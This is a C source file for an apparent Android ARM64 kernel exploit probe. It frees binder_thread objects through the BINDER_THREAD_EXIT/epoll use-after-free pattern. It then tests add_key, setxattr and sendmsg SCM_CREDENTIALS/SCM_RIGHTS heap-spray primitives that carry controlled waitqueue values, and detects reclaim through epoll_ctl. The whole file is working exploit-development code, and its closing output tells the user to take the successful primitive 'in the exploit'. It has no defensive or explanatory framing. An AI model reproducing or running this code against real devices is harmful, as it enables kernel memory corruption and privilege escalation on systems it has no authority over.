/*
 * slab_probe2.c — Test heap spray primitives that use REGULAR kmalloc
 *
 * The kernel has usercopy-kmalloc-* cache separation, which means:
 *   - iovec copy (via rw_copy_check_uvector) → usercopy-kmalloc-*
 *   - binder_thread (via kzalloc) → regular kmalloc-*
 * These caches can NEVER cross-reclaim.
 *
 * This probe tests spray primitives that go to REGULAR kmalloc:
 *   1. add_key("user", ...) — user_key_payload via kmalloc(GFP_KERNEL)
 *   2. setxattr — temporary kmalloc during xattr set
 *   3. sendmsg SCM_CREDENTIALS — properly formatted cmsg
 *
 * For each, we free a binder_thread then spray to see if we reclaim.
 *
 * Compile: aarch64-linux-musl-gcc -static -O2 -o slab_probe2 slab_probe2.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <linux/keyctl.h>

/* Define ucred if not available */
#ifndef SCM_CREDENTIALS
#define SCM_CREDENTIALS 0x02
#endif

struct ucred {
    pid_t pid;
    uid_t uid;
    gid_t gid;
};

#define BINDER_THREAD_EXIT  _IOW('b', 8, int32_t)

static volatile int got_signal = 0;
static void sighandler(int sig) { got_signal = sig; }

/* ========== SPRAY PRIMITIVE 1: add_key ========== */
/*
 * add_key("user", name, payload, payload_len, KEY_SPEC_PROCESS_KEYRING)
 *
 * Allocates: kmalloc(sizeof(struct user_key_payload) + payload_len, GFP_KERNEL)
 * On ARM64, sizeof(struct user_key_payload) = 24 bytes (rcu_head=16 + datalen=4 + pad=4)
 * Wait no — it's: struct rcu_head (16) + size_t datalen (8) + char data[0]
 * Total overhead ≈ 24 bytes
 *
 * So for kmalloc-256: payload_len = 256 - 24 = 232
 * For kmalloc-512: payload_len = 512 - 24 = 488
 *
 * The allocation persists until the key is revoked/unlinked.
 */

static int spray_addkey(int count, int payload_len, uint32_t marker) {
    char name[64];
    char *payload = malloc(payload_len);
    if (!payload) return -1;

    /* Fill payload with controlled data */
    memset(payload, 0, payload_len);
    /* At offset that corresponds to binder_thread waitqueue (0x48):
     * We subtract the user_key_payload header size (24 bytes)
     * So we want marker at payload offset 0x48 - 24 = 0x30 */
    int wq_off = 0x48 - 24;  /* waitqueue offset minus header */
    if (payload_len > wq_off + 16) {
        uint32_t zero = 0;
        memcpy(payload + wq_off, &zero, 4);  /* spinlock = 0 */
        /* Set list pointers to recognizable values */
        uint64_t mark = 0xDEAD000000000000ULL | marker;
        memcpy(payload + wq_off + 8, &mark, 8);   /* task_list.next */
        memcpy(payload + wq_off + 16, &mark, 8);  /* task_list.prev */
    }

    int sprayed = 0;
    int i;
    for (i = 0; i < count; i++) {
        snprintf(name, sizeof(name), "spray_%u_%d", marker, i);
        long ret = syscall(__NR_add_key, "user", name, payload, payload_len,
                          KEY_SPEC_PROCESS_KEYRING);
        if (ret >= 0)
            sprayed++;
        else if (i == 0)
            printf("    add_key failed: errno=%d (%s)\n", errno, strerror(errno));
    }

    free(payload);
    return sprayed;
}

/* ========== SPRAY PRIMITIVE 2: setxattr ========== */
/*
 * setxattr allocates: kmalloc(size, GFP_KERNEL) for the value
 * The allocation is temporary — freed after the syscall.
 * But between kmalloc and kfree, there's a window where it occupies the slot.
 *
 * Strategy: create a tmpfs file, then rapidly setxattr in a loop.
 * Do this WHILE another thread checks epoll.
 */
static int spray_setxattr(int count, int size, uint32_t marker) {
    char *value = malloc(size);
    if (!value) return -1;

    memset(value, 0, size);
    int wq_off = 0x48;
    if (size > wq_off + 16) {
        uint32_t zero = 0;
        memcpy(value + wq_off, &zero, 4);
        uint64_t mark = 0xDEAD000000000000ULL | marker;
        memcpy(value + wq_off + 8, &mark, 8);
        memcpy(value + wq_off + 16, &mark, 8);
    }

    /* Use /data/local/tmp as our filesystem */
    char path[128];
    snprintf(path, sizeof(path), "/data/local/tmp/xattr_spray_%u", marker);
    int fd = open(path, O_CREAT | O_WRONLY, 0666);
    if (fd < 0) {
        printf("    cannot create spray file: %s\n", strerror(errno));
        free(value);
        return -1;
    }
    close(fd);

    int sprayed = 0;
    int i;
    for (i = 0; i < count; i++) {
        /* setxattr with user.* namespace */
        char xname[64];
        snprintf(xname, sizeof(xname), "user.spray%d", i);
        if (setxattr(path, xname, value, size, 0) == 0)
            sprayed++;
        else if (i == 0)
            printf("    setxattr failed: errno=%d (%s)\n", errno, strerror(errno));
    }

    unlink(path);
    free(value);
    return sprayed;
}

/* ========== SPRAY PRIMITIVE 3: sendmsg SCM_CREDENTIALS ========== */
/*
 * sendmsg with properly formatted SCM_CREDENTIALS cmsg.
 * The kernel does sock_kmalloc for the control buffer.
 * For Unix sockets, the cmsg is processed and the buffer freed,
 * but we can send many in rapid succession.
 */
static int spray_scm_creds(int sv[2], int count) {
    struct msghdr msg;
    struct iovec iov;
    char data = 'A';
    int sprayed = 0;
    int i;

    /* Build SCM_CREDENTIALS control message */
    struct {
        struct cmsghdr hdr;
        struct ucred cred;
    } cmsg_buf;

    cmsg_buf.hdr.cmsg_len = sizeof(cmsg_buf);
    cmsg_buf.hdr.cmsg_level = SOL_SOCKET;
    cmsg_buf.hdr.cmsg_type = SCM_CREDENTIALS;
    cmsg_buf.cred.pid = getpid();
    cmsg_buf.cred.uid = getuid();
    cmsg_buf.cred.gid = getgid();

    for (i = 0; i < count; i++) {
        iov.iov_base = &data;
        iov.iov_len = 1;
        memset(&msg, 0, sizeof(msg));
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        msg.msg_control = &cmsg_buf;
        msg.msg_controllen = sizeof(cmsg_buf);

        if (sendmsg(sv[0], &msg, MSG_DONTWAIT) >= 0)
            sprayed++;
    }
    return sprayed;
}

/* ========== SPRAY PRIMITIVE 4: sendmsg SCM_RIGHTS (pass fd) ========== */
/*
 * Pass file descriptors via SCM_RIGHTS.
 * This creates scm_fp_list allocations AND copies the cmsg.
 * The fd references keep the data alive until recv.
 */
static int spray_scm_rights(int sv[2], int count) {
    struct msghdr msg;
    struct iovec iov;
    char data = 'A';
    int sprayed = 0;
    int i;

    /* Control buffer with one fd */
    union {
        char buf[CMSG_SPACE(sizeof(int))];
        struct cmsghdr align;
    } cmsg_buf;

    int pass_fd = sv[0]; /* pass ourselves as the fd */

    for (i = 0; i < count; i++) {
        iov.iov_base = &data;
        iov.iov_len = 1;
        memset(&msg, 0, sizeof(msg));
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        msg.msg_control = cmsg_buf.buf;
        msg.msg_controllen = sizeof(cmsg_buf.buf);

        struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
        cmsg->cmsg_level = SOL_SOCKET;
        cmsg->cmsg_type = SCM_RIGHTS;
        cmsg->cmsg_len = CMSG_LEN(sizeof(int));
        memcpy(CMSG_DATA(cmsg), &pass_fd, sizeof(int));

        if (sendmsg(sv[0], &msg, MSG_DONTWAIT) >= 0)
            sprayed++;
    }
    return sprayed;
}

/* ========== TEST HARNESS ========== */

/* Test a spray primitive: free binder_thread, spray, check epoll */
static void test_spray(const char *name, int spray_type, int spray_size, int spray_count) {
    printf("\n--- Testing %s (size=%d, count=%d) ---\n", name, spray_size, spray_count);

    pid_t pid = fork();
    if (pid < 0) { printf("  fork failed\n"); return; }

    if (pid == 0) {
        struct sigaction sa;
        memset(&sa, 0, sizeof(sa));
        sa.sa_handler = sighandler;
        sigaction(SIGSEGV, &sa, NULL);
        sigaction(SIGBUS, &sa, NULL);

        int bfd = open("/dev/binder", O_RDWR);
        if (bfd < 0) { printf("  binder open failed\n"); _exit(1); }
        void *bmap = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, bfd, 0);
        if (bmap == MAP_FAILED) { close(bfd); _exit(1); }

        uint64_t kptr_before = ((uint64_t *)bmap)[0];

        int epfd = epoll_create1(0);
        struct epoll_event ev = { .events = EPOLLIN, .data.fd = bfd };
        epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

        /* Free binder_thread */
        ioctl(bfd, BINDER_THREAD_EXIT, NULL);

        /* Spray */
        int sprayed = 0;
        int sv[2] = {-1, -1};

        if (spray_type >= 3) {
            if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
                printf("  socketpair failed\n");
                _exit(2);
            }
            /* Enable SO_PASSCRED for SCM_CREDENTIALS */
            int optval = 1;
            setsockopt(sv[0], SOL_SOCKET, SO_PASSCRED, &optval, sizeof(optval));
            setsockopt(sv[1], SOL_SOCKET, SO_PASSCRED, &optval, sizeof(optval));
        }

        switch (spray_type) {
            case 1: /* add_key */
                sprayed = spray_addkey(spray_count, spray_size, spray_size);
                break;
            case 2: /* setxattr */
                sprayed = spray_setxattr(spray_count, spray_size, spray_size);
                break;
            case 3: /* SCM_CREDENTIALS */
                sprayed = spray_scm_creds(sv, spray_count);
                break;
            case 4: /* SCM_RIGHTS */
                sprayed = spray_scm_rights(sv, spray_count);
                break;
        }
        printf("  sprayed %d objects\n", sprayed);

        if (sprayed == 0) {
            printf("  (no spray — skipping epoll test)\n");
            _exit(3);
        }

        /* Check kptr change */
        uint64_t kptr_after = ((uint64_t *)bmap)[0];
        if (kptr_after != kptr_before) {
            printf("  *** BINDER KPTR CHANGED: 0x%016llx → 0x%016llx ***\n",
                   (unsigned long long)kptr_before, (unsigned long long)kptr_after);
        }

        /* Test epoll on freed/sprayed binder_thread */
        got_signal = 0;
        errno = 0;
        ev.events = EPOLLIN | EPOLLOUT;
        int mod_ret = epoll_ctl(epfd, EPOLL_CTL_MOD, bfd, &ev);
        int mod_errno = errno;

        printf("  EPOLL_CTL_MOD: ret=%d errno=%d\n", mod_ret, mod_errno);

        if (got_signal) {
            printf("  *** SIGNAL %d — RECLAIM CONFIRMED! ***\n", got_signal);
            _exit(42);
        }

        /* More aggressive: EPOLL_CTL_DEL forces wait_queue cleanup */
        got_signal = 0;
        errno = 0;
        int del_ret = epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, &ev);
        printf("  EPOLL_CTL_DEL: ret=%d errno=%d\n", del_ret, errno);

        if (got_signal) {
            printf("  *** SIGNAL %d on DEL — RECLAIM CONFIRMED! ***\n", got_signal);
            _exit(42);
        }

        if (sv[0] >= 0) { close(sv[0]); close(sv[1]); }
        close(epfd);
        munmap(bmap, 4096);
        close(bfd);
        _exit(0);
    }

    /* Parent */
    alarm(15);
    int status;
    int wr = waitpid(pid, &status, 0);
    alarm(0);

    if (wr < 0) {
        printf("  TIMEOUT — child hung\n");
        kill(pid, SIGKILL);
        waitpid(pid, &status, 0);
    } else if (WIFEXITED(status)) {
        int code = WEXITSTATUS(status);
        if (code == 42)
            printf("  >>> RECLAIM CONFIRMED — %s WORKS! <<<\n", name);
        else if (code == 3)
            printf("  spray failed — primitive not available\n");
        else if (code == 0)
            printf("  no reclaim detected\n");
        else
            printf("  child exited %d\n", code);
    } else if (WIFSIGNALED(status)) {
        printf("  child killed by signal %d — possible reclaim + crash\n",
               WTERMSIG(status));
    }
}

/* ========== MULTI-FREE TEST ========== */
/*
 * Instead of freeing ONE binder_thread, free MANY.
 * Open N binder fds, register threads, free all, then spray.
 * More freed slots = better chance one gets reclaimed.
 */
static void test_multi_free_spray(int n_fds, int spray_type, int spray_size) {
    printf("\n--- Multi-free test: %d binder fds, spray_type=%d, size=%d ---\n",
           n_fds, spray_type, spray_size);

    pid_t pid = fork();
    if (pid < 0) return;

    if (pid == 0) {
        struct sigaction sa;
        memset(&sa, 0, sizeof(sa));
        sa.sa_handler = sighandler;
        sigaction(SIGSEGV, &sa, NULL);
        sigaction(SIGBUS, &sa, NULL);

        int bfds[32];
        void *bmaps[32];
        int epfds[32];
        int actual = 0;
        int i;

        /* Open many binders, each creates a thread on first ioctl */
        for (i = 0; i < n_fds && i < 32; i++) {
            bfds[i] = open("/dev/binder", O_RDWR);
            if (bfds[i] < 0) break;
            bmaps[i] = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, bfds[i], 0);
            if (bmaps[i] == MAP_FAILED) { close(bfds[i]); break; }

            epfds[i] = epoll_create1(0);
            struct epoll_event ev = { .events = EPOLLIN, .data.fd = bfds[i] };
            epoll_ctl(epfds[i], EPOLL_CTL_ADD, bfds[i], &ev);
            actual++;
        }
        printf("  opened %d binder fds\n", actual);

        /* Free ALL threads */
        for (i = 0; i < actual; i++) {
            ioctl(bfds[i], BINDER_THREAD_EXIT, NULL);
        }
        printf("  freed %d binder_threads\n", actual);

        /* Spray */
        int sprayed = 0;
        if (spray_type == 1) {
            sprayed = spray_addkey(512, spray_size, spray_size + 1000);
        } else if (spray_type == 2) {
            sprayed = spray_setxattr(512, spray_size, spray_size + 2000);
        }
        printf("  sprayed %d objects\n", sprayed);

        /* Check all epoll fds */
        int signals = 0;
        for (i = 0; i < actual; i++) {
            got_signal = 0;
            struct epoll_event ev = { .events = EPOLLIN | EPOLLOUT, .data.fd = bfds[i] };
            epoll_ctl(epfds[i], EPOLL_CTL_DEL, bfds[i], &ev);
            if (got_signal) {
                printf("  *** SIGNAL %d on fd[%d] — RECLAIM! ***\n", got_signal, i);
                signals++;
            }
        }

        /* Cleanup */
        for (i = 0; i < actual; i++) {
            close(epfds[i]);
            munmap(bmaps[i], 4096);
            close(bfds[i]);
        }

        if (signals > 0) {
            printf("  >>> %d RECLAIMS CONFIRMED! <<<\n", signals);
            _exit(42);
        }
        _exit(0);
    }

    alarm(30);
    int status;
    int wr = waitpid(pid, &status, 0);
    alarm(0);

    if (wr < 0) {
        printf("  TIMEOUT\n");
        kill(pid, SIGKILL);
        waitpid(pid, &status, 0);
    } else if (WIFEXITED(status)) {
        int code = WEXITSTATUS(status);
        if (code == 42) printf("  >>> MULTI-FREE RECLAIM WORKS! <<<\n");
        else printf("  exit=%d\n", code);
    } else if (WIFSIGNALED(status)) {
        printf("  killed by signal %d\n", WTERMSIG(status));
    }
}

int main(void) {
    printf("=== SLAB PROBE v2 — REGULAR KMALLOC SPRAY ===\n");
    printf("uid=%u\n", getuid());
    {
        char buf[256];
        int kfd = open("/proc/version", O_RDONLY);
        if (kfd >= 0) {
            int n = read(kfd, buf, sizeof(buf)-1);
            if (n > 0) { buf[n] = 0; printf("Kernel: %s\n", buf); }
            close(kfd);
        }
    }

    /* First: test if add_key syscall works */
    printf("\n=== PHASE 0: Syscall availability ===\n");
    {
        long ret = syscall(__NR_add_key, "user", "test_avail",
                          "test", 4, KEY_SPEC_PROCESS_KEYRING);
        printf("  add_key: %s (ret=%ld, errno=%d %s)\n",
               ret >= 0 ? "AVAILABLE" : "FAILED",
               ret, errno, ret < 0 ? strerror(errno) : "");
        if (ret >= 0) {
            /* Try to revoke it */
            syscall(__NR_keyctl, KEYCTL_REVOKE, ret);
        }
    }
    {
        /* Test setxattr availability */
        char path[] = "/data/local/tmp/xattr_test";
        int fd = open(path, O_CREAT | O_WRONLY, 0666);
        if (fd >= 0) {
            close(fd);
            int ret = setxattr(path, "user.test", "val", 3, 0);
            printf("  setxattr: %s (ret=%d, errno=%d %s)\n",
                   ret == 0 ? "AVAILABLE" : "FAILED",
                   ret, errno, ret < 0 ? strerror(errno) : "");
            unlink(path);
        }
    }

    /* Phase 1: add_key spray at various sizes */
    printf("\n=== PHASE 1: add_key spray ===\n");
    printf("sizeof(struct user_key_payload) approx 24 on ARM64\n");
    printf("For kmalloc-256: payload=232, for kmalloc-512: payload=488\n");

    /* Test sizes that would hit kmalloc-192, 256, 512 */
    int addkey_sizes[] = { 168, 200, 232, 300, 400, 488 };
    int n_addkey = sizeof(addkey_sizes) / sizeof(addkey_sizes[0]);
    int i;
    for (i = 0; i < n_addkey; i++) {
        char desc[64];
        int total = addkey_sizes[i] + 24;
        snprintf(desc, sizeof(desc), "add_key(payload=%d, total≈%d→kmalloc-%d)",
                addkey_sizes[i], total,
                total <= 64 ? 64 : total <= 128 ? 128 :
                total <= 192 ? 192 : total <= 256 ? 256 :
                total <= 512 ? 512 : 1024);
        test_spray(desc, 1, addkey_sizes[i], 256);
    }

    /* Phase 2: setxattr spray at various sizes */
    printf("\n=== PHASE 2: setxattr spray ===\n");
    int xattr_sizes[] = { 192, 256, 304, 384, 512 };
    int n_xattr = sizeof(xattr_sizes) / sizeof(xattr_sizes[0]);
    for (i = 0; i < n_xattr; i++) {
        char desc[64];
        snprintf(desc, sizeof(desc), "setxattr(size=%d→kmalloc-%d)",
                xattr_sizes[i],
                xattr_sizes[i] <= 192 ? 192 : xattr_sizes[i] <= 256 ? 256 :
                xattr_sizes[i] <= 512 ? 512 : 1024);
        test_spray(desc, 2, xattr_sizes[i], 512);
    }

    /* Phase 3: sendmsg with SCM_CREDENTIALS */
    printf("\n=== PHASE 3: sendmsg SCM_CREDENTIALS spray ===\n");
    test_spray("SCM_CREDENTIALS", 3, 0, 256);

    /* Phase 4: sendmsg with SCM_RIGHTS */
    printf("\n=== PHASE 4: sendmsg SCM_RIGHTS spray ===\n");
    test_spray("SCM_RIGHTS", 4, 0, 256);

    /* Phase 5: Multi-free with add_key spray */
    printf("\n=== PHASE 5: Multi-free + add_key spray ===\n");
    test_multi_free_spray(16, 1, 232);  /* 16 fds, kmalloc-256 */
    test_multi_free_spray(16, 1, 488);  /* 16 fds, kmalloc-512 */
    test_multi_free_spray(32, 1, 232);  /* 32 fds, kmalloc-256 */
    test_multi_free_spray(32, 1, 488);  /* 32 fds, kmalloc-512 */

    /* Phase 6: Multi-free with setxattr spray */
    printf("\n=== PHASE 6: Multi-free + setxattr spray ===\n");
    test_multi_free_spray(16, 2, 256);  /* 16 fds, kmalloc-256 */
    test_multi_free_spray(16, 2, 512);  /* 16 fds, kmalloc-512 */

    printf("\n=== PROBE v2 COMPLETE ===\n");
    printf("If ANY test showed SIGNAL or reclaim:\n");
    printf("  → That spray primitive + size can reclaim binder_thread!\n");
    printf("  → Use it in the exploit instead of iovec spray.\n");
    printf("If ALL tests failed:\n");
    printf("  → binder_thread may be in a DEDICATED slab cache\n");
    printf("  → Need to check if binder has its own kmem_cache\n");
    printf("  → Alternative: func ptr overwrite via different UAF path\n");
    return 0;
}
